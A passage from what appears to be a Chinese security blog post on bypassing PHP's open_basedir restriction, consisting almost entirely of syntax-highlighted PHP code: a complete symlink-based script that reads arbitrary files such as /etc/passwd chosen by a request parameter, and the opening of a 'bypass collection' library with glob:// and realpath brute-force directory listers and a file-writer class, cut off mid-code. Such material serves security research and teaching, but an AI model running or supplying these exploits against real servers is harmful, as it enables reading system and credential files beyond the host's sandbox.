class="line"><span class="comment">* detail: http://cxsecurity.com/issue/WLB-2009110068</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">'content-type: text/plain'</span>);</span><br><span class="line">error_reporting(<span class="number">-1</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">printf(<span class="string">"open_basedir: %s\nphp_version: %s\n"</span>, ini_get(<span class="string">'open_basedir'</span>), phpversion());</span><br><span class="line">printf(<span class="string">"disable_functions: %s\n"</span>, ini_get(<span class="string">'disable_functions'</span>));</span><br><span class="line">$file = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, <span class="keyword">isset</span>($_REQUEST[<span class="string">'file'</span>]) ? $_REQUEST[<span class="string">'file'</span>] : <span class="string">'/etc/passwd'</span>);</span><br><span class="line">$relat_file = getRelativePath(<span class="keyword">__FILE__</span>, $file);</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $file);</span><br><span class="line">$name = mt_rand() % <span class="number">999</span>;</span><br><span class="line">$exp = getRandStr();</span><br><span class="line">mkdir($name);</span><br><span class="line">chdir($name);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span> ; $i &lt; count($paths) - <span class="number">1</span> ; $i++)&#123;</span><br><span class="line">    mkdir($paths[$i]);</span><br><span class="line">    chdir($paths[$i]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir($paths[$i]);</span><br><span class="line"><span class="keyword">for</span> ($i -= <span class="number">1</span>; $i &gt; <span class="number">0</span>; $i--) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $relat_file);</span><br><span class="line">$j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $paths[$i] == <span class="string">'..'</span>; $i++) &#123; </span><br><span class="line">    mkdir($name);</span><br><span class="line">    chdir($name);</span><br><span class="line">    $j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= $j; $i++) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j + <span class="number">1</span>, $name);</span><br><span class="line">symlink(implode(<span class="string">'/'</span>, $tmp), <span class="string">'tmplink'</span>);</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j, <span class="string">'..'</span>);</span><br><span class="line">symlink(<span class="string">'tmplink/'</span> . implode(<span class="string">'/'</span>, $tmp) . $file, $exp);</span><br><span class="line">unlink(<span class="string">'tmplink'</span>);</span><br><span class="line">mkdir(<span class="string">'tmplink'</span>);</span><br><span class="line">delfile($name);</span><br><span class="line">$exp = dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>]) . <span class="string">"/&#123;$exp&#125;"</span>;</span><br><span class="line">$exp = <span class="string">"http://&#123;$_SERVER['SERVER_NAME']&#125;&#123;$exp&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n-----------------content---------------\n\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($exp);</span><br><span class="line">delfile(<span class="string">'tmplink'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">  $from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">  $from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">  $to   = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $to);</span><br><span class="line"></span><br><span class="line">  $from   = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">  $to     = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">  $relPath  = $to;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span>($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line">    <span class="comment">// find first non-matching dir</span></span><br><span class="line">    <span class="keyword">if</span>($dir === $to[$depth]) &#123;</span><br><span class="line">      <span class="comment">// ignore this directory</span></span><br><span class="line">      array_shift($relPath);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">      $remaining = count($from) - $depth;</span><br><span class="line">      <span class="keyword">if</span>($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">        $padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">        $relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delfile</span><span class="params">($deldir)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (@is_file($deldir)) &#123;</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @unlink($deldir);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(@is_dir($deldir))&#123;</span><br><span class="line">        <span class="keyword">if</span>(($mydir = @opendir($deldir)) == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">false</span> !== ($file = @readdir($mydir)))</span><br><span class="line">        &#123;</span><br><span class="line">            $name = File_Str($deldir.<span class="string">'/'</span>.$file);</span><br><span class="line">            <span class="keyword">if</span>(($file!=<span class="string">'.'</span>) &amp;&amp; ($file!=<span class="string">'..'</span>))&#123;delfile($name);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir($mydir);</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @rmdir($deldir) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">File_Str</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'//'</span>,<span class="string">'/'</span>,str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,$string));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span><span class="params">($length = <span class="number">6</span>)</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $randStr = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randStr .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/07/20/浅谈几种Bypass-open-basedir的方法/11.png" alt=""></p><h3 id="网上的一个脚本"><a href="#网上的一个脚本" class="headerlink" title="网上的一个脚本"></a>网上的一个脚本</h3><p>原理是用glob://伪协议：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PHP open_basedir bypass collection</span></span><br><span class="line"><span class="comment">Works with &gt;= PHP5</span></span><br><span class="line"><span class="comment">By /fd, <span class="doctag">@filedescriptor</span>(https://twitter.com/filedescriptor)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant functions</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line"><span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">$from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">$from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">$to = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $to);</span><br><span class="line"> </span><br><span class="line">$from = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">$to = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">$relPath = $to;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> ($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line"><span class="comment">// find first non-matching dir</span></span><br><span class="line"><span class="keyword">if</span> ($dir === $to[$depth]) &#123;</span><br><span class="line"><span class="comment">// ignore this directory</span></span><br><span class="line">array_shift($relPath);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">$remaining = count($from) - $depth;</span><br><span class="line"><span class="keyword">if</span> ($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">$padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">$relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fallback</span><span class="params">($classes)</span> </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">$object = <span class="keyword">new</span> $class;</span><br><span class="line"><span class="keyword">if</span> ($object-&gt;isAvailable()) &#123;</span><br><span class="line"><span class="keyword">return</span> $object;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> NoExploit;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Core classes</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoExploit</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'No exploit is available.'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">DirectoryLister</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $currentPath;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCurrentPath</span><span class="params">($currentPath)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;currentPath = $currentPath;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCurrentPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;currentPath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GlobWrapperDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> stripos(PHP_OS, <span class="string">'win'</span>) === <span class="keyword">FALSE</span> &amp;&amp; in_array(<span class="string">'glob'</span>, stream_get_wrappers());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Directory listing via glob pattern'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">$file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">$file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">return</span> $file_list;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealpathBruteForceDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $characters = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789-_'</span></span><br><span class="line">, $extension = <span class="keyword">array</span>()</span><br><span class="line">, $charactersLength = <span class="number">38</span></span><br><span class="line">, $maxlength = <span class="number">3</span></span><br><span class="line">, $fileList = <span class="keyword">array</span>();</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ini_get(<span class="string">'open_basedir'</span>) &amp;&amp; function_exists(<span class="string">'realpath'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Directory listing via brute force searching with realpath function.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCharacters</span><span class="params">($characters)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;characters = $characters;</span><br><span class="line"><span class="keyword">$this</span>-&gt;charactersLength = count($characters);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setExtension</span><span class="params">($extension)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;extension = $extension;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setMaxlength</span><span class="params">($maxlength)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;maxlength = $maxlength;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">set_error_handler(<span class="keyword">array</span>(<span class="keyword">__CLASS__</span>, <span class="string">'handler'</span>));</span><br><span class="line">$number_set = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">while</span> (count($number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, <span class="number">0</span>)) &lt;= <span class="keyword">$this</span>-&gt;maxlength) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;searchFile($number_set);</span><br><span class="line">&#125;</span><br><span class="line">sort(<span class="keyword">$this</span>-&gt;fileList);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fileList;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nextCombination</span><span class="params">($number_set, $length)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($number_set[$length])) &#123;</span><br><span class="line">$number_set[$length] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> $number_set;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($number_set[$length] + <span class="number">1</span> === <span class="keyword">$this</span>-&gt;charactersLength) &#123;</span><br><span class="line">$number_set[$length] = <span class="number">0</span>;</span><br><span class="line">$number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, $length + <span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$number_set[$length]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $number_set;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">searchFile</span><span class="params">($number_set)</span> </span>&#123;</span><br><span class="line">$file_name = <span class="string">'a'</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($number_set <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$file_name[$key] = <span class="keyword">$this</span>-&gt;characters[$value];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name);</span><br><span class="line"><span class="comment">// files with preceeding dot</span></span><br><span class="line">realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . <span class="string">'.'</span> . $file_name);</span><br><span class="line"><span class="comment">// files with extension</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;extension <span class="keyword">as</span> $extension) &#123;</span><br><span class="line">realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name . $extension);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">$regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">preg_match($regexp, $errstr, $matches);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;fileList[] = $matches[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileWriter</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> 